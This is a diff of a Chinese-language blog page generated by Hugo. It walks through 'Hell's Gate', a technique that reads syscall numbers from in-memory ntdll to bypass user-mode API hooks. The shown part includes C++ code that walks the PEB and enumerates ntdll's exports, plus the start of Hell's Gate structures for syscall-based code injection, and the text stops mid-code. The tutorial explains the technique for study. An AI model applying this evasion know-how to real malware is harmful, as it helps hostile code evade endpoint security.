@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="generator" content="Hugo 0.88.1" />
+  <meta name="generator" content="Hugo 0.100.1" />
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -21,7 +21,7 @@
       "articleSection" : "posts",
       "name" : "Hells Gate",
       "headline" : "Hells Gate",
-      "description" : "简介 也就是地狱之门，涉及到的前置知识是PEB。\n原理就是从内存里的ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。主要来应对 对 Ring3 API 的 HOOK，不同版本的 Windows Nt*函数的系统调用号不同，。\n前置知识 PEB可以在 x86 进程的线程环境块(TEB)中的 fs:[0x30] 以及 x64 进程的 GS:[0x60] 中找到。\n这里就涉及到了两个API\n __readgsqword __readfsqword   看名称也可以看出来fs和gs嘛\n 可以看见TEB结构体里有PEB\n先获得TEB、PEB的地址：r $teb，r $peb\nPEB里一个属性Ldr指向了_PEB_LDR_DATA结构，这个结构里就存储着所需的信息\nInLoadOrderModuleList: 指的是模块加载的顺序 InMemoryOrderModuleList: 指的是在内存的排列顺序 InInitializationOrderModuleLists: 指的是模块初始化装载顺序\n 那么到底用哪个，差别是什么可以在参考链接里的第一个先知文章里找到答案\n 双向链表的头部包含进程的加载模块。链表的每一个都是指向LDR_DATA_TABLE_ENTRY 结构的指针\n所以InMemoryOrderModuleList里的Flink的地址，指向了一个LDR_DATA_TABLE_ENTRY\nFlink总是指向下一个_LDR_DATA_TABLE_ENTRY结构对应加载顺序的Flink指针\n我们所需的就是_LDR_DATA_TABLE_ENTRY-\u0026gt;Flink.Flink这个地址\n如果是_LDR_DATA_TABLE_ENTRY-\u0026gt;Flink地址，就是我们第一个的模块\n 记住0x0000014d`0a0223c0，下一个就用它\n  然后再记0x0000014d`0a0229e0，下一个用它\n 就这样可以循环下去\n可以查看下dll载入内存的顺序\n上面用到的-0x10是啥嘞，就是为了对齐。\n这个结构如果是x86的就是8个字节，x64的就是16个字节\n使用InMemoryOrderModuleList来查找\n我们要对齐，对齐方式就是-16个字节\n如果不进行对齐的话\n 可以看见两图 明显不一样\n 实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。\n#include \u0026lt;iostream\u0026gt;#include \u0026lt;intrin.h\u0026gt;#include \u0026lt;Windows.h\u0026gt;#include \u0026lt;winternl.",
+      "description" : "简介 也就是地狱之门，涉及到的前置知识是PEB。\n原理就是从内存里的ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。主要来应对 对 Ring3 API 的 HOOK，不同版本的 Windows Nt*函数的系统调用号不同，。\n前置知识 PEB可以在 x86 进程的线程环境块(TEB)中的 fs:[0x30] 以及 x64 进程的 GS:[0x60] 中找到。\n这里就涉及到了两个API\n__readgsqword __readfsqword 看名称也可以看出来fs和gs嘛\n可以看见TEB结构体里有PEB\n先获得TEB、PEB的地址：r $teb，r $peb\nPEB里一个属性Ldr指向了_PEB_LDR_DATA结构，这个结构里就存储着所需的信息\nInLoadOrderModuleList: 指的是模块加载的顺序 InMemoryOrderModuleList: 指的是在内存的排列顺序 InInitializationOrderModuleLists: 指的是模块初始化装载顺序\n那么到底用哪个，差别是什么可以在参考链接里的第一个先知文章里找到答案\n双向链表的头部包含进程的加载模块。链表的每一个都是指向LDR_DATA_TABLE_ENTRY 结构的指针\n所以InMemoryOrderModuleList里的Flink的地址，指向了一个LDR_DATA_TABLE_ENTRY\nFlink总是指向下一个_LDR_DATA_TABLE_ENTRY结构对应加载顺序的Flink指针\n我们所需的就是_LDR_DATA_TABLE_ENTRY-\u0026gt;Flink.Flink这个地址\n如果是_LDR_DATA_TABLE_ENTRY-\u0026gt;Flink地址，就是我们第一个的模块\n记住0x0000014d`0a0223c0，下一个就用它\n然后再记0x0000014d`0a0229e0，下一个用它\n就这样可以循环下去\n可以查看下dll载入内存的顺序\n上面用到的-0x10是啥嘞，就是为了对齐。\n这个结构如果是x86的就是8个字节，x64的就是16个字节\n使用InMemoryOrderModuleList来查找\n我们要对齐，对齐方式就是-16个字节\n如果不进行对齐的话\n可以看见两图 明显不一样\n实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;intrin.h\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; int GetPeHeader() { PBYTE ImageBase; PIMAGE_DOS_HEADER Dos = NULL; PIMAGE_NT_HEADERS Nt = NULL; PIMAGE_FILE_HEADER File = NULL; PIMAGE_OPTIONAL_HEADER Optional = NULL; PIMAGE_EXPORT_DIRECTORY ExportTable = NULL; PPEB Peb = (PPEB)__readgsqword(0x60);\t\/\/ 定位到PEB PLDR_DATA_TABLE_ENTRY pLoadModule; \/\/ NTDLL pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-\u0026gt;Ldr-\u0026gt;InMemoryOrderModuleList.",
       "inLanguage" : "en-US",
       "author" : "Muxue",
       "creator" : "Muxue",
@@ -42,56 +42,56 @@
 原理就是从内存里的ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。主要来应对 对 Ring3 API 的 HOOK，不同版本的 Windows Nt*函数的系统调用号不同，。
 前置知识 PEB可以在 x86 进程的线程环境块(TEB)中的 fs:[0x30] 以及 x64 进程的 GS:[0x60] 中找到。
 这里就涉及到了两个API
- __readgsqword __readfsqword   看名称也可以看出来fs和gs嘛
- 可以看见TEB结构体里有PEB
+__readgsqword __readfsqword 看名称也可以看出来fs和gs嘛
+可以看见TEB结构体里有PEB
 先获得TEB、PEB的地址：r $teb，r $peb
 PEB里一个属性Ldr指向了_PEB_LDR_DATA结构，这个结构里就存储着所需的信息
 InLoadOrderModuleList: 指的是模块加载的顺序 InMemoryOrderModuleList: 指的是在内存的排列顺序 InInitializationOrderModuleLists: 指的是模块初始化装载顺序
- 那么到底用哪个，差别是什么可以在参考链接里的第一个先知文章里找到答案
- 双向链表的头部包含进程的加载模块。链表的每一个都是指向LDR_DATA_TABLE_ENTRY 结构的指针
+那么到底用哪个，差别是什么可以在参考链接里的第一个先知文章里找到答案
+双向链表的头部包含进程的加载模块。链表的每一个都是指向LDR_DATA_TABLE_ENTRY 结构的指针
 所以InMemoryOrderModuleList里的Flink的地址，指向了一个LDR_DATA_TABLE_ENTRY
 Flink总是指向下一个_LDR_DATA_TABLE_ENTRY结构对应加载顺序的Flink指针
 我们所需的就是_LDR_DATA_TABLE_ENTRY-&amp;gt;Flink.Flink这个地址
 如果是_LDR_DATA_TABLE_ENTRY-&amp;gt;Flink地址，就是我们第一个的模块
- 记住0x0000014d`0a0223c0，下一个就用它
-  然后再记0x0000014d`0a0229e0，下一个用它
- 就这样可以循环下去
+记住0x0000014d`0a0223c0，下一个就用它
+然后再记0x0000014d`0a0229e0，下一个用它
+就这样可以循环下去
 可以查看下dll载入内存的顺序
 上面用到的-0x10是啥嘞，就是为了对齐。
 这个结构如果是x86的就是8个字节，x64的就是16个字节
 使用InMemoryOrderModuleList来查找
 我们要对齐，对齐方式就是-16个字节
 如果不进行对齐的话
- 可以看见两图 明显不一样
- 实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。
-#include &amp;lt;iostream&amp;gt;#include &amp;lt;intrin.h&amp;gt;#include &amp;lt;Windows.h&amp;gt;#include &amp;lt;winternl." />
+可以看见两图 明显不一样
+实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。
+#include &amp;lt;iostream&amp;gt; #include &amp;lt;intrin.h&amp;gt; #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;winternl.h&amp;gt; int GetPeHeader() { PBYTE ImageBase; PIMAGE_DOS_HEADER Dos = NULL; PIMAGE_NT_HEADERS Nt = NULL; PIMAGE_FILE_HEADER File = NULL; PIMAGE_OPTIONAL_HEADER Optional = NULL; PIMAGE_EXPORT_DIRECTORY ExportTable = NULL; PPEB Peb = (PPEB)__readgsqword(0x60);	// 定位到PEB PLDR_DATA_TABLE_ENTRY pLoadModule; // NTDLL pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&amp;gt;Ldr-&amp;gt;InMemoryOrderModuleList." />
   <meta name="description" content="简介 也就是地狱之门，涉及到的前置知识是PEB。
 原理就是从内存里的ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。主要来应对 对 Ring3 API 的 HOOK，不同版本的 Windows Nt*函数的系统调用号不同，。
 前置知识 PEB可以在 x86 进程的线程环境块(TEB)中的 fs:[0x30] 以及 x64 进程的 GS:[0x60] 中找到。
 这里就涉及到了两个API
- __readgsqword __readfsqword   看名称也可以看出来fs和gs嘛
- 可以看见TEB结构体里有PEB
+__readgsqword __readfsqword 看名称也可以看出来fs和gs嘛
+可以看见TEB结构体里有PEB
 先获得TEB、PEB的地址：r $teb，r $peb
 PEB里一个属性Ldr指向了_PEB_LDR_DATA结构，这个结构里就存储着所需的信息
 InLoadOrderModuleList: 指的是模块加载的顺序 InMemoryOrderModuleList: 指的是在内存的排列顺序 InInitializationOrderModuleLists: 指的是模块初始化装载顺序
- 那么到底用哪个，差别是什么可以在参考链接里的第一个先知文章里找到答案
- 双向链表的头部包含进程的加载模块。链表的每一个都是指向LDR_DATA_TABLE_ENTRY 结构的指针
+那么到底用哪个，差别是什么可以在参考链接里的第一个先知文章里找到答案
+双向链表的头部包含进程的加载模块。链表的每一个都是指向LDR_DATA_TABLE_ENTRY 结构的指针
 所以InMemoryOrderModuleList里的Flink的地址，指向了一个LDR_DATA_TABLE_ENTRY
 Flink总是指向下一个_LDR_DATA_TABLE_ENTRY结构对应加载顺序的Flink指针
 我们所需的就是_LDR_DATA_TABLE_ENTRY-&amp;gt;Flink.Flink这个地址
 如果是_LDR_DATA_TABLE_ENTRY-&amp;gt;Flink地址，就是我们第一个的模块
- 记住0x0000014d`0a0223c0，下一个就用它
-  然后再记0x0000014d`0a0229e0，下一个用它
- 就这样可以循环下去
+记住0x0000014d`0a0223c0，下一个就用它
+然后再记0x0000014d`0a0229e0，下一个用它
+就这样可以循环下去
 可以查看下dll载入内存的顺序
 上面用到的-0x10是啥嘞，就是为了对齐。
 这个结构如果是x86的就是8个字节，x64的就是16个字节
 使用InMemoryOrderModuleList来查找
 我们要对齐，对齐方式就是-16个字节
 如果不进行对齐的话
- 可以看见两图 明显不一样
- 实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。
-#include &amp;lt;iostream&amp;gt;#include &amp;lt;intrin.h&amp;gt;#include &amp;lt;Windows.h&amp;gt;#include &amp;lt;winternl." />
+可以看见两图 明显不一样
+实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。
+#include &amp;lt;iostream&amp;gt; #include &amp;lt;intrin.h&amp;gt; #include &amp;lt;Windows.h&amp;gt; #include &amp;lt;winternl.h&amp;gt; int GetPeHeader() { PBYTE ImageBase; PIMAGE_DOS_HEADER Dos = NULL; PIMAGE_NT_HEADERS Nt = NULL; PIMAGE_FILE_HEADER File = NULL; PIMAGE_OPTIONAL_HEADER Optional = NULL; PIMAGE_EXPORT_DIRECTORY ExportTable = NULL; PPEB Peb = (PPEB)__readgsqword(0x60);	// 定位到PEB PLDR_DATA_TABLE_ENTRY pLoadModule; // NTDLL pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&amp;gt;Ldr-&amp;gt;InMemoryOrderModuleList." />
   <meta property="og:locale" content="en-us" />
 
   
@@ -161,7 +161,7 @@ Flink总是指向下一个_LDR_DATA_TABLE_ENTRY结构对应加载顺序的Flink�
             <div class="col-xs-6">
               
               <div class="post-author">
-                <a target="_blank" href="https://github.com/muxue">@Muxue</a>
+                <a target="_blank" href="https://github.com/secxue">@Muxue</a>
               </div>
               
             </div>
@@ -222,162 +222,162 @@ Flink总是指向下一个_LDR_DATA_TABLE_ENTRY结构对应加载顺序的Flink�
 <p>可以看见两图 明显不一样</p>
 </blockquote>
 <p>实现一个遍历ntdll.dll里所有导出函数的代码，直接拿的cRIspr师傅的，然后我改了一下。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;intrin.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">GetPeHeader</span>()
-{
-	PBYTE ImageBase;
-	PIMAGE_DOS_HEADER Dos <span style="color:#f92672">=</span> NULL;
-	PIMAGE_NT_HEADERS Nt <span style="color:#f92672">=</span> NULL;
-	PIMAGE_FILE_HEADER File <span style="color:#f92672">=</span> NULL;
-	PIMAGE_OPTIONAL_HEADER Optional <span style="color:#f92672">=</span> NULL;
-	PIMAGE_EXPORT_DIRECTORY ExportTable <span style="color:#f92672">=</span> NULL;
-
-	PPEB Peb <span style="color:#f92672">=</span> (PPEB)__readgsqword(<span style="color:#ae81ff">0x60</span>);		<span style="color:#75715e">// 定位到PEB
-</span><span style="color:#75715e"></span>	PLDR_DATA_TABLE_ENTRY pLoadModule;
-	<span style="color:#75715e">// NTDLL
-</span><span style="color:#75715e"></span>	pLoadModule <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb<span style="color:#f92672">-&gt;</span>Ldr<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList.Flink<span style="color:#f92672">-&gt;</span>Flink <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>);		<span style="color:#75715e">// 这种在windbg手动实现了，就是找到了ntdll.dll
-</span><span style="color:#75715e"></span>	ImageBase <span style="color:#f92672">=</span> (PBYTE)pLoadModule<span style="color:#f92672">-&gt;</span>DllBase;	<span style="color:#75715e">// 获取到dll的地址	
-</span><span style="color:#75715e"></span>
-	Dos <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)ImageBase;		<span style="color:#75715e">// 定位dos头
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (Dos<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)	<span style="color:#75715e">// 判断是不是dos头
-</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-	Nt <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((PBYTE)Dos <span style="color:#f92672">+</span> Dos<span style="color:#f92672">-&gt;</span>e_lfanew);	<span style="color:#75715e">// 定位PE头
-</span><span style="color:#75715e"></span>	File <span style="color:#f92672">=</span> (PIMAGE_FILE_HEADER)(ImageBase <span style="color:#f92672">+</span> (Dos<span style="color:#f92672">-&gt;</span>e_lfanew <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(DWORD)));	<span style="color:#75715e">// 标准PE头, 这里用&amp;Nt-&gt;FileHeader也可以
-</span><span style="color:#75715e"></span>	Optional <span style="color:#f92672">=</span> (PIMAGE_OPTIONAL_HEADER)((PBYTE)File <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(IMAGE_FILE_HEADER));	<span style="color:#75715e">// 拓展PE头,&amp;Nt-&gt;OptionalHeader
-</span><span style="color:#75715e"></span>	ExportTable <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(ImageBase <span style="color:#f92672">+</span> Optional<span style="color:#f92672">-&gt;</span>DataDirectory[<span style="color:#ae81ff">0</span>].VirtualAddress);		<span style="color:#75715e">// 导出表
-</span><span style="color:#75715e"></span>
-	PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)(ImageBase <span style="color:#f92672">+</span> ExportTable<span style="color:#f92672">-&gt;</span>AddressOfFunctions));		<span style="color:#75715e">// 导出函数地址表
-</span><span style="color:#75715e"></span>	PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)ImageBase <span style="color:#f92672">+</span> ExportTable<span style="color:#f92672">-&gt;</span>AddressOfNames);				<span style="color:#75715e">// 导出函数名字表
-</span><span style="color:#75715e"></span>	PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)ImageBase <span style="color:#f92672">+</span> ExportTable<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);	<span style="color:#75715e">// 导出函数序号表
-</span><span style="color:#75715e"></span>
-	<span style="color:#66d9ef">for</span> (WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> ExportTable<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>)
-	{
-		PCHAR pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)ImageBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);		<span style="color:#75715e">// 函数名字
-</span><span style="color:#75715e"></span>		PVOID pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)ImageBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];	<span style="color:#75715e">// 序号表的值为地址表的索引
-</span><span style="color:#75715e"></span>		printf(<span style="color:#e6db74">&#34;Function Name:%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Function Address:%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pczFunctionName, pFunctionAddress);
-	}
-}
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
-	GetPeHeader();
-	system(<span style="color:#e6db74">&#34;pause&#34;</span>);
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
-}
-</code></pre></div><p>先定义了一个<code>LDR_MODULE</code>的结构体，存放<code>_LDR_DATA_TABLE_ENTRY</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;intrin.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">GetPeHeader</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	PBYTE ImageBase;
+</span></span><span style="display:flex;"><span>	PIMAGE_DOS_HEADER Dos <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	PIMAGE_NT_HEADERS Nt <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	PIMAGE_FILE_HEADER File <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	PIMAGE_OPTIONAL_HEADER Optional <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	PIMAGE_EXPORT_DIRECTORY ExportTable <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PPEB Peb <span style="color:#f92672">=</span> (PPEB)__readgsqword(<span style="color:#ae81ff">0x60</span>);		<span style="color:#75715e">// 定位到PEB
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PLDR_DATA_TABLE_ENTRY pLoadModule;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// NTDLL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	pLoadModule <span style="color:#f92672">=</span> (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb<span style="color:#f92672">-&gt;</span>Ldr<span style="color:#f92672">-&gt;</span>InMemoryOrderModuleList.Flink<span style="color:#f92672">-&gt;</span>Flink <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>);		<span style="color:#75715e">// 这种在windbg手动实现了，就是找到了ntdll.dll
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ImageBase <span style="color:#f92672">=</span> (PBYTE)pLoadModule<span style="color:#f92672">-&gt;</span>DllBase;	<span style="color:#75715e">// 获取到dll的地址	
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	Dos <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)ImageBase;		<span style="color:#75715e">// 定位dos头
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (Dos<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE)	<span style="color:#75715e">// 判断是不是dos头
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	Nt <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((PBYTE)Dos <span style="color:#f92672">+</span> Dos<span style="color:#f92672">-&gt;</span>e_lfanew);	<span style="color:#75715e">// 定位PE头
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	File <span style="color:#f92672">=</span> (PIMAGE_FILE_HEADER)(ImageBase <span style="color:#f92672">+</span> (Dos<span style="color:#f92672">-&gt;</span>e_lfanew <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(DWORD)));	<span style="color:#75715e">// 标准PE头, 这里用&amp;Nt-&gt;FileHeader也可以
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	Optional <span style="color:#f92672">=</span> (PIMAGE_OPTIONAL_HEADER)((PBYTE)File <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(IMAGE_FILE_HEADER));	<span style="color:#75715e">// 拓展PE头,&amp;Nt-&gt;OptionalHeader
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ExportTable <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)(ImageBase <span style="color:#f92672">+</span> Optional<span style="color:#f92672">-&gt;</span>DataDirectory[<span style="color:#ae81ff">0</span>].VirtualAddress);		<span style="color:#75715e">// 导出表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)(ImageBase <span style="color:#f92672">+</span> ExportTable<span style="color:#f92672">-&gt;</span>AddressOfFunctions));		<span style="color:#75715e">// 导出函数地址表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)ImageBase <span style="color:#f92672">+</span> ExportTable<span style="color:#f92672">-&gt;</span>AddressOfNames);				<span style="color:#75715e">// 导出函数名字表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)ImageBase <span style="color:#f92672">+</span> ExportTable<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);	<span style="color:#75715e">// 导出函数序号表
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> ExportTable<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		PCHAR pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)ImageBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);		<span style="color:#75715e">// 函数名字
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		PVOID pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)ImageBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];	<span style="color:#75715e">// 序号表的值为地址表的索引
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		printf(<span style="color:#e6db74">&#34;Function Name:%s</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Function Address:%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pczFunctionName, pFunctionAddress);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	GetPeHeader();
+</span></span><span style="display:flex;"><span>	system(<span style="color:#e6db74">&#34;pause&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>先定义了一个<code>LDR_MODULE</code>的结构体，存放<code>_LDR_DATA_TABLE_ENTRY</code></p>
 <p>因为是直接从内存中读取的嘛，所以也不需要搞偏移</p>
 <p><a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FLDR_MODULE.html">http://undocumented.ntinternals.net/index.html?page=UserMode%2FStructures%2FLDR_MODULE.html</a></p>
 <h2 id="地狱之门">地狱之门</h2>
 <p>前置知识过完了，就开始解读地狱之门的代码了</p>
 <p>代码里先定义了俩结构体</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_VX_TABLE_ENTRY</span> {	
-	PVOID   pAddress;		<span style="color:#75715e">// 指向内存模块的函数地址指针
-</span><span style="color:#75715e"></span>	DWORD64 dwHash;			<span style="color:#75715e">// 函数Hash
-</span><span style="color:#75715e"></span>	WORD    wSystemCall;	<span style="color:#75715e">// Syscall Number
-</span><span style="color:#75715e"></span>} VX_TABLE_ENTRY, <span style="color:#f92672">*</span> PVX_TABLE_ENTRY;
-
-<span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_VX_TABLE</span> {	<span style="color:#75715e">// 用来存放每一个系统调用的函数
-</span><span style="color:#75715e"></span>	VX_TABLE_ENTRY NtAllocateVirtualMemory;
-	VX_TABLE_ENTRY NtProtectVirtualMemory;
-	VX_TABLE_ENTRY NtCreateThreadEx;
-	VX_TABLE_ENTRY NtWaitForSingleObject;
-} VX_TABLE, <span style="color:#f92672">*</span> PVX_TABLE;
-</code></pre></div><p>然后又定义了几个函数原型</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">PTEB <span style="color:#a6e22e">RtlGetThreadEnvironmentBlock</span>();
-BOOL <span style="color:#a6e22e">GetImageExportDirectory</span>(
-	_In_ PVOID                     pModuleBase,
-	_Out_ PIMAGE_EXPORT_DIRECTORY<span style="color:#f92672">*</span> ppImageExportDirectory
-);
-BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(
-	_In_ PVOID pModuleBase,
-	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
-	_In_ PVX_TABLE_ENTRY pVxTableEntry
-);
-BOOL <span style="color:#a6e22e">Payload</span>(
-	_In_ PVX_TABLE pVxTable
-);
-PVOID <span style="color:#a6e22e">VxMoveMemory</span>(
-	_Inout_ PVOID dest,
-	_In_    <span style="color:#66d9ef">const</span> PVOID src,
-	_In_    SIZE_T len
-);
-</code></pre></div><p>extern 定义了俩函数，是存放在<code>hellsgate.asm</code>里的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#66d9ef">extern</span> VOID <span style="color:#a6e22e">HellsGate</span>(WORD wSystemCall);
-<span style="color:#66d9ef">extern</span> <span style="color:#a6e22e">HellDescent</span>();
-</code></pre></div><p><img src="/images/HellsGate/image-20220325085154625.png" alt="image-20220325085154625"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_VX_TABLE_ENTRY</span> {	
+</span></span><span style="display:flex;"><span>	PVOID   pAddress;		<span style="color:#75715e">// 指向内存模块的函数地址指针
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD64 dwHash;			<span style="color:#75715e">// 函数Hash
